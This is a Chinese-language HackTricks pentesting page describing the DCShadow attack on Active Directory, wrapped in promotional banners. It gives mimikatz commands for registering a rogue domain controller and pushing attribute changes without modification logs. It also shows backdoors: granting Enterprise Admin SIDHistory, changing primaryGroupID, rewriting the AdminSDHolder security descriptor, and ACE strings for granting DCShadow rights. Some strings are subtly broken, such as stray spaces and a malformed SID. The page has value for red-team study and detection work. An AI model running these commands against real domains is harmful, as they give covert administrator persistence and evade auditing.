<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


# DCShadow

它在AD中注册一个**新的域控制器**，并使用它来在指定的对象上**推送属性**（SIDHistory，SPNs...），而不会留下任何关于**修改**的**日志**。您需要DA权限并位于**根域**内。\
请注意，如果使用错误的数据，将会出现相当丑陋的日志。

要执行此攻击，您需要2个mimikatz实例。其中一个将使用SYSTEM权限启动RPC服务器（您必须在此处指示要执行的更改），另一个实例将用于推送值：

{% code title="mimikatz1（RPC服务器）" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2（推送）- 需要DA或类似权限" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

请注意，**`elevate::token`** 在 mimikatz1 会话中不起作用，因为它提升了线程的权限，但我们需要提升**进程的权限**。\
您还可以选择并使用 "LDAP" 对象：`/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

您可以从具有以下最低权限的 DA 或用户推送更改：

* 在**域对象**中：
* _DS-Install-Replica_（在域中添加/删除副本）
* _DS-Replication-Manage-Topology_（管理复制拓扑）
* _DS-Replication-Synchronize_（复制同步）
* **配置容器**中的**站点对象**（及其子对象）：
* _CreateChild 和 DeleteChild_
* **注册为 DC 的计算机对象**：
* _WriteProperty_（不是 Write）
* **目标对象**：
* _WriteProperty_（不是 Write）

您可以使用[**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)将这些权限授予非特权用户（请注意，这将留下一些日志）。这比拥有 DA 权限要严格得多。\
例如：`Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` 这意味着当用户名为 _**student1**_ 的用户在机器 _**mcorp-student1**_ 上登录时，对象 _**root1user**_ 具有 DCShadow 权限。

## 使用 DCShadow 创建后门

{% code title="将 SIDHistory 设置为用户的企业管理员" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% code title="更改PrimaryGroupID（将用户设置为域管理员的成员）" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="修改 AdminSDHolder 的 ntSecurityDescriptor（给用户完全控制权限）" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - 使用DCShadow授予DCShadow权限（无修改权限日志）

我们需要在以下ACE后面添加我们用户的SID：

* 在域对象上：
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* 在攻击者计算机对象上：`(A;;WP;;;UserSID)`
* 在目标用户对象上：`(A;;WP;;;UserSID)`
* 在配置容器中的Sites对象上：`(A;CI;CCDC;;;UserSID)`

要获取对象的当前ACE：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

请注意，在这种情况下，您需要进行**多个更改**，而不仅仅是一个。因此，在**mimikatz1会话**（RPC服务器）中，使用参数**`/stack`和每个更改**一起使用。这样，您只需要**`/push`**一次即可执行所有堆积的更改。

[**有关ired.team中DCShadow的更多信息。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>
